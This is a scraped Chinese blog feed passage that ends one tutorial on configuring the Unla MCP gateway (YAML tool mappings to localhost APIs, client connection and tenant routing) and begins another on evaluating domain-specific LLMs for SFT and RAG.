    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users"</span>                 <span class="hljs-comment"># 目标服务地址</span>
    <span class="hljs-attr">headers:</span>                                                <span class="hljs-comment"># 请求头配置，用于在请求目标服务时携带的请求头</span>
      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">"application/json"</span>                      <span class="hljs-comment"># 写死的请求头</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Authorization}}</span>"</span>            <span class="hljs-comment"># 使用服务配置中的值</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>                          <span class="hljs-comment"># 使用服务配置中的值</span>
    <span class="hljs-attr">args:</span>                         <span class="hljs-comment"># 参数配置</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"username"</span>          <span class="hljs-comment"># 参数名称</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>          <span class="hljs-comment"># 参数位置：header, query, path, body, form-data</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>            <span class="hljs-comment"># 参数是否必填</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>            <span class="hljs-comment"># 参数类型</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Username"</span>   <span class="hljs-comment"># 参数描述</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>               <span class="hljs-comment"># 默认值</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">requestBody:</span> <span class="hljs-string">|-</span>               <span class="hljs-comment"># 请求体模板，用于动态生成请求体，如：从参数（MCP的请求arguments）中提取的值</span>
      {
        <span class="hljs-attr">"username":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.username}}</span>"</span>,
        <span class="hljs-attr">"email":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.email}}</span>"</span>
      }
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-</span>              <span class="hljs-comment"># 响应体模板，用于动态生成响应体，如：从响应中提取的值</span>
      {
        <span class="hljs-attr">"id":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.id}}</span>"</span>,
        <span class="hljs-attr">"username":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.username}}</span>"</span>,
        <span class="hljs-attr">"email":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.email}}</span>"</span>,
        <span class="hljs-attr">"createdAt":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.createdAt}}</span>"</span>
      }

  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"get_user_by_email"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Get user by email"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"GET"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/email/<span class="hljs-template-variable">{{.Args.email}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "id": "{{.Response.Data.id}}",
        "username": "{{.Response.Data.username}}",
        "email": "{{.Response.Data.email}}",
        "createdAt": "{{.Response.Data.createdAt}}"
      }
</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"update_user_preferences"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Update user preferences"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"PUT"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/<span class="hljs-template-variable">{{.Args.email}}</span>/preferences"</span>
    <span class="hljs-attr">headers:</span>
      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">"application/json"</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Request.Headers.Authorization}}</span>"</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"isPublic"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether the user profile is public"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"false"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"showEmail"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether to show email in profile"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"true"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"theme"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User interface theme"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"light"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"tags"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"array"</span>
        <span class="hljs-attr">items:</span>
          <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
          <span class="hljs-attr">enum:</span> [<span class="hljs-string">"developer"</span>, <span class="hljs-string">"designer"</span>, <span class="hljs-string">"manager"</span>, <span class="hljs-string">"tester"</span>]
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User role tags"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"[]"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"settings"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"object"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User custom settings as key-value pairs"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"{}"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"notifications"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"array"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User notification preferences"</span>
        <span class="hljs-attr">items:</span>
          <span class="hljs-attr">type:</span> <span class="hljs-string">"object"</span>
          <span class="hljs-attr">properties:</span>
            <span class="hljs-attr">type:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification type (email, push, sms)"</span>
            <span class="hljs-attr">channel:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification channel (marketing, system, security)"</span>
            <span class="hljs-attr">enabled:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether this notification is enabled"</span>
            <span class="hljs-attr">frequency:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"number"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification frequency (0: realtime, 1: daily, 2: weekly, 3: monthly)"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"[]"</span>
    <span class="hljs-attr">requestBody:</span> <span class="hljs-string">|-</span>                   <span class="hljs-comment"># toJSON：对非JSON原生支持的类型转为JSON格式</span>
      {
        <span class="hljs-attr">"isPublic":</span> {{<span class="hljs-string">.Args.isPublic</span>}},
        <span class="hljs-attr">"showEmail":</span> {{<span class="hljs-string">.Args.showEmail</span>}},
        <span class="hljs-attr">"theme":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.theme}}</span>"</span>,
        <span class="hljs-attr">"tags":</span> {{<span class="hljs-string">.Args.tags</span>}},
        <span class="hljs-attr">"settings":</span> {{ <span class="hljs-string">toJSON</span> <span class="hljs-string">.Args.settings</span> }},
        <span class="hljs-attr">"notifications":</span> {{ <span class="hljs-string">.Args.notifications</span> }}
      }
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "id": "{{.Response.Data.id}}",
        "username": "{{.Response.Data.username}}",
        "email": "{{.Response.Data.email}}",
        "createdAt": "{{.Response.Data.createdAt}}",
        "preferences": {
          "isPublic": {{.Response.Data.preferences.isPublic}},
          "showEmail": {{.Response.Data.preferences.showEmail}},
          "theme": "{{.Response.Data.preferences.theme}}",
          "tags": {{.Response.Data.preferences.tags}},
          "settings": {{ toJSON .Response.Data.preferences.settings }},
          "notifications": {{ toJSON .Response.Data.preferences.notifications }}
        }
      }
</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"update_user_avatar"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Update user avatar using a URL via multipart form"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"POST"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/<span class="hljs-template-variable">{{.Args.email}}</span>/avatar"</span>
    <span class="hljs-attr">headers:</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Request.Headers.Authorization}}</span>"</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email of the user"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"url"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"form-data"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"The avatar image URL"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "message": "{{.Response.Data.message}}",
        "avatarUrl": "{{.Response.Data.avatarUrl}}"
      }
</span></code></pre>
<ul>
<li><strong>网关处理逻辑</strong>：
当 AI 客户端请求该工具时，Unla 网关会自动构造 HTTP 请求发往后端，并将结果封装为 MCP 响应返回。</li>
</ul>
<h4 data-id="heading-4">三、 客户端接入</h4>
<p>配置完成后，你需要让你的 AI 客户端（如  Dify, Cursor, Claude Desktop）连接到 Unla 网关。</p>
<ol>
<li><strong>获取接入点 URL</strong>：
在 Unla 控制面板查看生成 SSE 和 HTTP 两种类型的端点地址，通常格式为：<code>http://&lt;your-gateway-ip&gt;:5235/{tenant_id}/&lt;server-name&gt;/sse</code>和<code>http://&lt;your-gateway-ip&gt;:5235/{tenant_id}/&lt;server-name&gt;/mcp</code></li>
<li><strong>在客户端配置</strong>（以 Dify 为例）：
<ul>
<li>工具 -&gt; MCP -&gt; 添加MCP服务。</li>
<li>添加“服务端点，名称，服务器标识符，请求头”等信息</li>
</ul>
</li>
</ol>
<h4 data-id="heading-5">四、租户管理</h4>
<h5 data-id="heading-6">1. 租户的作用</h5>
<p>在 Unla 中，租户（Tenant）是一个逻辑隔离单位。其主要用途包括：</p>
<ul>
<li><strong>资源隔离</strong>：不同项目组或部门可以拥有独立的 MCP Server 集合，互不干扰。</li>
<li><strong>配置复用</strong>：可以在不同租户下配置同名的 Server（如 <code>prod-db</code> 和 <code>dev-db</code>），通过租户 ID 进行区分。</li>
<li><strong>安全合规</strong>：为每个租户分配独立的 <code>API Key</code> 或 <code>JWT Secret</code>，确保 A 租户无法调用 B 租户的工具。</li>
</ul>
<h5 data-id="heading-7">2. 租户在网关前缀（Gateway Prefix）中的匹配逻辑</h5>
<p>Unla 网关通过 URL 路径中的前缀来识别请求所属的租户和服务。</p>
<p>标准的路由匹配格式通常如下：
<code>http://&lt;gateway-host&gt;:&lt;port&gt;/{tenant_id}/{server_name}/sse</code> 或 <code>http://&lt;gateway-host&gt;:&lt;port&gt;/{tenant_id}/{server_name}/mcp</code></p>
<hr/>
<h4 data-id="heading-8">五、操作建议</h4>
<ol>
<li><strong>先创建租户</strong>：在 Web UI 的 <strong>"租户管理"</strong> 模块创建租户，并记录其 <code>ID</code>。</li>
<li><strong>绑定 Server</strong>：在创建网关代理配置时，务必选择所属的 <strong>"租户"</strong>。</li>
<li><strong>路由配置</strong>：路由前缀必须以 <strong>"租户ID"</strong> 开头，否则失败。</li>
<li><strong>正确YAML配置文件格式</strong>：通过YAML模式进行网关配置时，确保正确的缩进，否则会失败。</li>
<li><strong>正确的JSON格式数据</strong>：在配置请求或响应Body时，对非JSON原生支持的数据类型通过<code>toJSON</code>进行转换。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SFT、RAG 调优效率翻倍！垂直领域大模型评估实战指南]]></title>    <link>https://juejin.cn/post/7594791357144383530</link>    <guid>https://juejin.cn/post/7594791357144383530</guid>    <pubDate>2026-01-14T11:29:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594791357144383530" data-draft-id="7594791357144367146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SFT、RAG 调优效率翻倍！垂直领域大模型评估实战指南"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-14T11:29:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ConardLi"/> <meta itemprop="url" content="https://juejin.cn/user/3949101466785709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SFT、RAG 调优效率翻倍！垂直领域大模型评估实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101466785709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ConardLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:29:48.000Z" title="Wed Jan 14 2026 11:29:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本期视频教程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1CRrVB7Eb4%2F" target="_blank" title="https://www.bilibili.com/video/BV1CRrVB7Eb4/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1CR…</a></p>
<hr/>
<ul>
<li>如何评估模型在垂直领域下的表现？</li>
<li>如何评估模型微调前后的效果？</li>
<li>如何量化 RAG 系统的召回率？</li>
<li>如何从领域知识创建模型评估数据集？</li>
</ul>
<hr/>
<p>大家好，欢迎来到 code秘密花园，我是花园老师（ConardLi）。</p>
<p>现在大家都在搞大模型落地，不管是做 RAG（检索增强生成）还是 SFT（监督微调），最让开发者头秃的其实不是 “怎么训练”，而是 “怎么知道训练得好不好”。</p>
<p>在上一期教程：《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FkQIcb6gggF5wf08qjuJcyQ" target="_blank" title="https://mp.weixin.qq.com/s/kQIcb6gggF5wf08qjuJcyQ" ref="nofollow noopener noreferrer">世界最顶级的大模型，都在 PK 些啥？ （大模型评估完全指南）</a>》 中，我们主要介绍了大模型评估的核心流程和业界主流的一些通用 Benchmark（基准测试）。</p>
<p>这些基准一般都用于通用大模型的能力测试，榜单（像 <code>MMLU、ARC</code> ）分数再高，一旦用到具体的业务场景，比如法律合同审核、医疗报告分析、或者公司内部的维修手册，这些通用分数的参考意义就非常有限了。</p>
<p>今天我们就来聊聊，在垂直领域，我们具体应该怎么评估模型的表现？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f69bc972fa7478ab01abdb07c742366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=7M2e%2FogNyaJjTylym0fMHqIg%2FVM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">第一部分：理论篇</h2>
<h3 data-id="heading-1">1. 为什么通用评估不够用？</h3>
<p>通用模型往往在公开互联网语料上表现良好，但对于企业内部文档、未公开的行业规范等“长尾知识”表现不佳，必须进行专项评估。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84026c8ee4e0426ba5e19741619e7124~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=EBPd5Wf%2FHmUhTzEnbY%2BWJYBTWzI%3D" alt="" loading="lazy"/></p>
<p>我们在实际业务中，评估模型通常是为了解决三个很具体的问题：</p>
<ul>
<li>
<p><strong>选型心里没底：</strong>
开源模型那么多（Qwen, DeepSeek, MiniMax...），在没微调之前，谁对我的业务文档理解能力更强？如果不跑一遍自己的数据，盲选很容易踩坑。</p>
</li>
<li>
<p><strong>微调效果验证（SFT）：</strong>
你花钱花时间微调了一个模型，Loss 曲线看着挺好，但模型真的变聪明了吗？还是说它只是记住了训练集？更糟糕的是，它会不会学会了专业知识，却把通用的对话能力搞丢了（灾难性遗忘）？这需要对比测试才知道。</p>
</li>
<li>
<p><strong>RAG 系统的“甩锅”依据：</strong>
在检索增强生成（RAG）架构中，模型是否准确利用了检索到的上下文？是否存在幻觉？这需要针对性的评估指标。</p>
</li>
</ul>
<h3 data-id="heading-2">2. 主流的评估方法</h3>
<p>传统的垂直领域评估通常需要 “懂行的人” 来阅卷。但是，行业专家的工作时间是极其昂贵的，几十条数据还能看，成千上万条数据靠纯人工就不太现实了。</p>
<p>而且人的主观标准变动很大，例如，一个文案是“准确”还是“生动”？这种主观性会导致评估结果波动大，难以作为模型对比的硬指标。</p>
<p>在真实的业务场景中，模型在特定领域表现的评估通常靠以下几类评估方法：</p>
<h4 data-id="heading-3">方案一：确定性评估</h4>
<p>标准答案和模型回答的完全匹配是最直接、成本最低的方式。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7de01379e7b546968b719cee7290a5a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=3QdSqpHJSuGqgYafLeWuGKLy41g%3D" alt="" loading="lazy"/></p>
<p>这类评估只能限制在某些特定的题目类型上，就像我们在考试的时候做的判断题、单选题、多选题。</p>
<p>它们的答案是固定的，非黑即白，是否得分还是很好评估的。</p>
<p>但是，此类数据集的制定还是有一定成本的，通用评估集（如 MMLU）涵盖面广但深度不足。针对特定业务的、包含标准答案的高质量题库非常稀缺，往往需要资深专家手工编写，效率极低。</p>
<h4 data-id="heading-4">方案二：基于统计的文本相似度</h4>
<p>比如我们经常听到的 <code>BLEU</code>、<code>ROUGE</code>、<code>METEOR</code> 这些指标是自然语言处理（NLP）领域最常用的自动文本生成评估指标，核心作用是量化机器生成文本（如翻译、摘要、对话回复）与人工标注的参考文本之间的相似度，判断生成结果的质量。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51db7177823d45b0a02541728013814c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=kC4vu%2BGUp6bYI86CgS9oGbsMtUg%3D" alt="" loading="lazy"/></p>
<p>这类指标计算的本质上都是生成文本与参考文本的词汇重叠度。在 LLM 时代，意思相同但表达方式不同的情况是非常普遍的（标准答案是 “利率上调”，模型回答 “加息”。字面上没重合，得分很低，但意思完全一样。），所以参考价值不大了。</p>
<p>在垂直领域知识评估中，这类指标的权重正在被大幅降低，因为它们很容易误杀好模型。</p>
<h4 data-id="heading-5">方案三：基于模型的语义评估</h4>
<p>也就是我们上期教程中提到的 <code>LLM as a Judge</code>。</p>
<p>这是目前搞开放式问答的最优解。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0321e2150ece4d14adc588feb6a9bf0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=em%2FNcB21L%2FUXEALvFwE9RIp2tu4%3D" alt="" loading="lazy"/></p>
<p>核心逻辑：用一个更强、更聪明的模型（比如 <code>GPT-5</code>）当裁判，去给业务模型（比如 <code>Qwen3-7B</code> 的小模型）打分。</p>
<p>此类评估的关键不在流程，而是评分细则（Prompt），不同类型的数据集通常需要制定特定的评估标准。</p>
<h3 data-id="heading-6">3. 真实工作中面临的痛点</h3>
<p>在真实的评估工作中，我们往往面临着以下痛点：</p>
